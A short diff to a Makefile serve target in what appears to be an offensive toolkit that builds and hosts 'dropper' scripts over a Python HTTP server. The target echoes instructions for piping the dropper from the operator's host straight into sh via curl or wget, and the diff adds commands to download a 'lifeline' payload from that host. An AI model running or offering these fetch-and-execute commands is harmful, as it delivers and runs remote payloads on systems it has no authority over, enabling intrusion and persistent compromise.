@@ -40,6 +40,10 @@ serve:	build/dropper.pl build/dropper.sh
 	@echo " Temp file:                                              "
 	@echo "  curl http://$(HOST):$(PY_PORT)/dropper.sh | sh         "
 	@echo "  wget -O - http://$(HOST):$(PY_PORT)/dropper.sh | sh    "
+	@echo "                                                         "
+	@echo " Raw download:                                           "
+	@echo "  curl http://$(HOST):$(PY_PORT)/lifeline > lifeline     "
+	@echo "  wget http://$(HOST):$(PY_PORT)/lifeline                "
 	@echo "========================================================="
 	@echo ""
 	@cd build; python3 -m http.server $(PY_PORT)
